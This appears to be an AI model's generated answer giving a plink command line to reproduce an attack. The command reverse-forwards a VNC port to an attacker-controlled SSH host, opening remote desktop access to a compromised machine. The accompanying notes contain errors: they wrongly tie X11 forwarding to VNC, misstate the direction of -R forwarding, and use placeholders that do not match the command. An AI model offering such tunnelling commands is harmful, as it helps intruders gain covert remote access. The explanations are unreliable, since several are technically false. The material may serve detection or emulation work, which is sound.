Based on the provided documentation and the attack description, I will generate realistic command lines using **only** the tool plink to reproduce the attack behavior.

Command: `plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>`

Note:
- The `-load` option is used to load a saved session, which is not explicitly mentioned in the documentation but can be inferred as it is supported by PuTTY.
- The `-X` option enables X11 forwarding, allowing VNC connections.
- The `-v` option shows verbose messages for debugging purposes.
- The `-R` option forwards a local port to a remote address, enabling VNC connections.

Replace `<sessname>` with the actual saved session name, `<attacker_ssh_user>` with the attacker's SSH username, and `<target_host>` with the target host IP address or hostname.
